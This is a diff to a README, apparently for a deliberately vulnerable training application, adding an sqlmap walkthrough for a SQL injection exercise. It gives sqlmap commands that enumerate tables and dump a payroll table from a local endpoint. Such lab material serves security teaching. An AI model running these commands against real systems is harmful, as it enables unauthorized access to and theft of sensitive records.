@@ -103,6 +103,26 @@ Docker Build:
 
 ## BONUS Exploit - SQL Injection
 
+### sqlmap Approach
+
+1. List database tables:
+
+    ```bash
+    sqlmap -u http://localhost:8000/read-contact \
+      --data='{"first_name":"doesnt","last_name":"matter"}' \
+      -p first_name --batch --tables
+    ```
+
+2. Dump payroll table:
+
+    ```bash
+    sqlmap -u http://localhost:8000/read-contact \
+      --data='{"first_name":"doesnt","last_name":"matter"}' \
+      -p first_name --batch -T payroll --dump
+    ```
+
+### Manual Approach
+
 1. Discover another sensitive table in the database:
 
     ```bash
